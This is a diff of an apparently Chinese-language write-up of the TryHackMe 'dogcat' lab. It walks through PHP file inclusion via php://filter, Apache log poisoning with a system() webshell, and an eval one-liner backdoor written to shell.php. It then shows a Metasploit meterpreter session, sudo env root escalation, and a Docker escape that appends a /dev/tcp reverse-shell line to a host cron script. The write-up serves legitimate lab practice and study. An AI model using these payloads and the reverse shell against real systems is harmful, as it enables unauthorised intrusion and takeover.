@@ -1,10 +1,13 @@
+# 免责声明
+>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。
+
 # 服务发现
 ```
 ┌──(root💀kali)-[~/tryhackme]
 └─#  nmap -sV -Pn 10.10.228.190                         
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-23 01:40 EDT
-Nmap scan report for 10.10.199.124
+Nmap scan report for 10.10.108.119
 Host is up (0.31s latency).
 Not shown: 998 closed ports
 PORT   STATE SERVICE VERSION
@@ -20,7 +23,7 @@ Nmap done: 1 IP address (1 host up) scanned in 39.93 seconds
 # 目录爆破，只有cat和dog两个已知文件夹，各有10张图片
 ```
 ┌──(root💀kali)-[~/dirsearch]
-└─#  python3 dirsearch.py -u "http://10.10.199.124" -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -e* -t 100
+└─#  python3 dirsearch.py -u "http://10.10.108.119" -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -e* -t 100
 
  _|. _ _  _  _  _ _|_    v0.3.8
 (_||| _) (/_(_|| (_| )
@@ -29,12 +32,12 @@ Extensions: * | HTTP method: get | Threads: 100 | Wordlist size: 220521
 
 Error Log: /root/dirsearch/logs/errors-21-09-23_01-46-47.log
 
-Target: http://10.10.199.124
+Target: http://10.10.108.119
 
 [01:46:48] Starting: 
 [01:46:49] 200 -  418B  - /
-[01:47:04] 301 -  311B  - /cats  ->  http://10.10.199.124/cats/
-[01:47:10] 301 -  311B  - /dogs  ->  http://10.10.199.124/dogs/
+[01:47:04] 301 -  311B  - /cats  ->  http://10.10.108.119/cats/
+[01:47:10] 301 -  311B  - /dogs  ->  http://10.10.108.119/dogs/
 [01:52:19] 403 -  277B  - /server-status  
 ```
 
@@ -44,11 +47,11 @@ Target: http://10.10.199.124
 $dir = $_GET["view"] .'.php';
 include($dir);
 ```
-http://10.10.199.124/?view=dog
+
 
 
 构造payload
-```http://10.10.199.124/?view=php://filter/read=convert.base64-encode/resource=./cat/../index```
+```/?view=php://filter/read=convert.base64-encode/resource=./cat/../index```
 
 得到index.php的源码base64字符串
 ```
@@ -76,7 +79,7 @@ PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAg
             function containsStr($str, $substr) {
                 return strpos($str, $substr) !== false;
             }
-	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
+        $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
             if(isset($_GET['view'])) {
                 if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                     echo 'Here you go!';
@@ -92,13 +95,13 @@ PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAg
 </html>
 ```
 
-# 源码分析
+## 源码分析
 大概与我们猜想的一致，需要留意``` $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';```这行代码，文件后缀其实是可以指定的，不指定默认是```.php```
 
-# 构造参数读取/etc/passwd文件
-```http://10.10.199.124/?view=php://filter/read=convert.base64-encode/resource=./cat/../../../../etc/passwd&ext=&```
+构造参数读取/etc/passwd文件
+```http://10.10.108.119/?view=php://filter/read=convert.base64-encode/resource=./cat/../../../../etc/passwd&ext=&```
 
-# 解密为
+解密为
 ```
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -134,7 +137,7 @@ base64decode完后查看log记录
 127.0.0.1 - - [03/Nov/2021:08:43:15 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
 127.0.0.1 - - [03/Nov/2021:08:43:52 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
 10.13.21.169 - - [03/Nov/2021:08:44:01 +0000] "GET /?view=php://filter/read=convert.base64-encode/resource=./cat/../../../../etc/passwd&ext=& HTTP/1.1" 200 1071 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
-10.13.21.169 - - [03/Nov/2021:08:44:01 +0000] "GET /style.css HTTP/1.1" 200 662 "http://10.10.199.124/?view=php://filter/read=convert.base64-encode/resource=./cat/../../../../etc/passwd&ext=&" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
+10.13.21.169 - - [03/Nov/2021:08:44:01 +0000] "GET /style.css HTTP/1.1" 200 662 "http://10.10.108.119/?view=php://filter/read=convert.base64-encode/resource=./cat/../../../../etc/passwd&ext=&" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
 10.13.21.169 - - [03/Nov/2021:08:44:02 +0000] "GET /favicon.ico HTTP/1.1" 404 455 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
 ```
 
@@ -145,6 +148,12 @@ base64decode完后查看log记录
 
 # getshell
 
+这里我试了很多方法也反弹不了shell，于是我把下面的脚本作为一个简单的websdll写进了日志
+```
+<?php system($_GET['cmd']);?>
+```
+
+burosuite上为：
 ```
 GET /?view=./cat/../../../../var/log/apache2/access.log&ext=&cmd=ls HTTP/1.1
 Host: 10.10.228.190
@@ -157,10 +166,142 @@ Upgrade-Insecure-Requests: 1
 Cache-Control: max-age=0
 ```
 
+这个时候就可以通过cmd的传参执行命令
+```
+/?view=./cat/../../../../var/log/apache2/access.log&ext=&cmd=whoami
+```
 
-<?php system($_GET['cmd']);?>
+在这里我依然反弹不了shell，只好通过一个比较绕的方法拿到稳定的webshell
+
+用下面的payload把一句话木马写进服务器
+
+```/?view=./cat/../../../../var/log/apache2/access.log&ext=&cmd=echo '<?php @eval($_POST[c]);?>' >%20 /var/www/html/shell.php```
 
 
+打开msf，选择中国菜刀，填好相关配置信息
+
+```
+msf6 exploit(multi/http/caidao_php_backdoor_exec) > options
+
+Module options (exploit/multi/http/caidao_php_backdoor_exec):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD   c                yes       The password of backdoor
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.10.108.119    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /shell.php       yes       The path of backdoor
+   VHOST                       no        HTTP server virtual host
 
 
-echo "<?php eval(@$_POST[a]); ?>" >  /var/www/html/shell.php
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  tun0             yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+```
+
+
+拿到webshell
+```
+msf6 exploit(multi/http/caidao_php_backdoor_exec) > run
+
+[*] Started reverse TCP handler on 10.13.21.169:4444 
+[*] Sending exploit...
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/http/caidao_php_backdoor_exec) > run
+
+[*] Started reverse TCP handler on 10.13.21.169:4444 
+[*] Sending exploit...
+[*] Sending stage (39282 bytes) to 10.10.108.119
+[*] Meterpreter session 1 opened (10.13.21.169:4444 -> 10.10.108.119:48230) at 2021-11-03 08:20:09 -0400
+
+meterpreter > shell
+Process 179 created.
+Channel 0 created.
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+```
+
+
+在```/var/www/html```找到flag1
+
+在```/var/www```找到flag2
+
+# 提权
+用```/bin/sh -i```切换成tty
+
+查看当前用户超级权限
+```
+$ sudo -l
+Matching Defaults entries for www-data on 679ddf26d89f:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on 679ddf26d89f:
+    (root) NOPASSWD: /usr/bin/env
+```
+
+发现可以直接使用```env```提权
+
+
+直接提权到root
+
+```
+$ sudo /usr/bin/env /bin/sh
+id
+uid=0(root) gid=0(root) groups=0(root)
+whoami
+root
+
+```
+
+全局查找flag相关文件：
+```find / -name *flag*```
+在```/root/flag3.txt```找到flag3
+
+在系统里查找所有文件里包含flag字样的文件：
+```find / |xargs grep -ri 'flag' -l ```
+
+
+发现一个可疑的文件
+```/opt/backups/backup.tar```
+
+解压出来以后发现是一个docker的container，也就是说这个系统是在docker里面的
+
+
+# Docker逃逸
+我们之所以找不到flag4，是因为我们是在docker里面，这个时候需要利用docker逃逸到宿主机
+
+关于Docker逃逸，推荐参考[这篇文章](https://xz.aliyun.com/t/8558)
+
+```/opt/backups```应该是宿主机和Docker机器的共享文件夹
+
+查看```/opt/backups```下的```backup.sh```文件，猜测这个脚本会被宿主机定时执行
+```
+# cat backup.sh
+#!/bin/bash
+tar cf /root/container/backup/backup.tar /root/container
+
+```
+我们把下面的命令追加到```backup.sh```文件:
+```echo 'bash -i >& /dev/tcp/10.13.21.169/4455 0>&1' >> backup.sh```
+
+
+另起一个端口，等待大约一分钟，收到宿主机的反弹shell，拿到flag4：
+
+```
+┌──(root💀kali)-[~/tryhackme/dogcat]
+└─# nc -lnvp 4455
+listening on [any] 4455 ...
+connect to [10.13.21.169] from (UNKNOWN) [10.10.108.119] 47114
+bash: cannot set terminal process group (15772): Inappropriate ioctl for device
+bash: no job control in this shell
+root@dogcat:~# ls
+ls
+container
+flag4.txt
+```
